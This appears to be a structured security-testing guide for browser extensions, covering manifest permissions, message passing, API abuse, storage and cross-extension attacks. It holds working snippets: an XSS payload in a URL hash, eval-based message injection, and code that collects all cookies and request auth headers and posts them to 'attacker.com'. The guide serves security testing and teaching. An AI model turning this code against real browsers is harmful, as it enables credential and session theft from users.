<browser_extension_security_guide>
<title>BROWSER EXTENSION SECURITY</title>

<critical>Browser extensions have elevated privileges: content script injection, message passing, storage access, and API access. Test content script injection points, message passing vulnerabilities, extension API abuse, storage access exploitation, cross-extension attacks, and background script vulnerabilities.</critical>

<scope>
- Content script injection points and CSP bypass
- Message passing vulnerabilities (content ↔ background)
- Extension API abuse (tabs, cookies, webRequest)
- Storage access exploitation (chrome.storage)
- Cross-extension communication attacks
- Background script vulnerabilities
- Manifest permissions analysis
- Update mechanism vulnerabilities
</scope>

<methodology>
1. Extract extension: chrome://extensions → Developer mode → Load unpacked
2. Analyze manifest.json: permissions, content_scripts, background
3. Test content scripts: injection points, message passing
4. Test message passing: authorization, input validation
5. Test API abuse: overreach permissions
6. Test storage: sensitive data leakage
7. Test cross-extension: enumerate other extensions
8. Test XSS: escalate via extension context
</methodology>

<content_script_injection>
<injection_points>
// manifest.json
"content_scripts": [{
    "matches": ["<all_urls>"],  // injected everywhere
    "js": ["content.js"]
}]

// content.js can access page DOM
document.getElementById('password').value  // steal passwords
</injection_points>

<dom_xss_in_extension>
// content.js
const userInput = location.hash.substr(1);
document.getElementById('output').innerHTML = userInput;  // XSS

Attack: https://example.com/#<img src=x onerror=alert(1)>
</dom_xss_in_extension>
</content_script_injection>

<message_passing_vulns>
<unauthenticated_messages>
// background.js
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'executeSensitive') {
        performSensitive();  // no sender validation
    }
});

// Any page can send
chrome.runtime.sendMessage(extensionId, {action: 'executeSensitive'});
</unauthenticated_messages>

<message_injection>
// background.js trusts content script
chrome.runtime.onMessage.addListener((msg) => {
    eval(msg.code);  // RCE in extension context
});

// Attacker-controlled page
chrome.runtime.sendMessage(extensionId, {code: 'alert(document.cookie)'});
</message_injection>
</message_passing_vulns>

<extension_api_abuse>
<tabs_api>
// With "tabs" permission
chrome.tabs.query({}, tabs => {
    tabs.forEach(tab => {
        // Access all tab URLs, inject scripts
        chrome.tabs.executeScript(tab.id, {code: 'alert(document.cookie)'});
    });
});
</tabs_api>

<cookies_api>
// With "cookies" permission
chrome.cookies.getAll({}, cookies => {
    // Exfiltrate all browser cookies
    fetch('http://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify(cookies)
    });
});
</cookies_api>

<webrequest_api>
// With "webRequest" permission
chrome.webRequest.onBeforeSendHeaders.addListener(
    details => {
        // Steal auth headers from all requests
        fetch('http://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify(details.requestHeaders)
        });
    },
    {urls: ["<all_urls>"]},
    ["requestHeaders"]
);
</webrequest_api>
</extension_api_abuse>

<storage_exploitation>
<sensitive_data>
// Check chrome.storage for secrets
chrome.storage.local.get(null, data => {
    console.log(data);  // API keys, tokens, user data
});

// Stored: {apiKey: 'secret', token: 'jwt'}
</sensitive_data>

<storage_injection>
// Extension trusts storage
chrome.storage.local.get('config', data => {
    eval(data.config.script);  // if attacker can set storage
});

// Malicious extension or XSS
chrome.storage.local.set({config: {script: 'malicious()'}});
</storage_injection>
</storage_exploitation>

<cross_extension_attacks>
<extension_enumeration>
// Enumerate installed extensions
const commonExtensionIds = ['aapbdbdomjkkjkaonfhkkikfgjllcleb', ...];
commonExtensionIds.forEach(id => {
    chrome.runtime.sendMessage(id, {ping: true}, response => {
        if (response) console.log(`Found extension: ${id}`);
    });
});
</extension_enumeration>

<message_hijacking>
// Extension A listens for messages
chrome.runtime.onMessageExternal.addListener((msg, sender) => {
    if (msg.action === 'getData') {
        return {data: sensitiveData};  // no authorization
    }
});

// Extension B (malicious) requests
chrome.runtime.sendMessage(targetExtensionId, {action: 'getData'});
</message_hijacking>
</cross_extension_attacks>

<validation>
1. Extract extension source: chrome://extensions, Load unpacked
2. Analyze manifest.json: permissions (tabs, cookies, <all_urls>)
3. Test message passing: send unauthorized messages
4. Test content script: XSS, data exfiltration
5. Test storage: sensitive data, injection points
6. Test API abuse: enumerate tabs, steal cookies
7. Demonstrate impact: credential theft, API abuse, XSS escalation
</validation>

<impact>
- Credential theft (cookies, storage, forms)
- Cross-site scripting in extension context
- API abuse (tabs, cookies, webRequest)
- Cross-extension data theft
- Man-in-the-middle (webRequest modification)
- Sensitive data exfiltration from storage
</impact>

<pro_tips>
1. Check manifest.json permissions first—overly broad is suspicious
2. "<all_urls>" permission extremely powerful—grants universal access
3. Test message passing with chrome.runtime.sendMessage from any page
4. Content scripts have access to page DOM—can steal form data
5. Background scripts persist—check for data exfiltration loops
6. chrome.storage not encrypted—secrets stored in plaintext
7. Extension IDs are predictable—enumerate common extensions
8. webRequest API enables MITM of all browser traffic
9. externally_connectable in manifest allows which sites to message extension
10. Look for eval(), innerHTML in extension code—XSS vectors
</pro_tips>

<remember>Secure extensions require: minimal permissions, message sender validation, no eval/innerHTML, encrypted storage for secrets, CSP enforcement, and careful API usage. Extensions with "tabs", "cookies", or "<all_urls>" are high-value targets.</remember>
</browser_extension_security_guide>
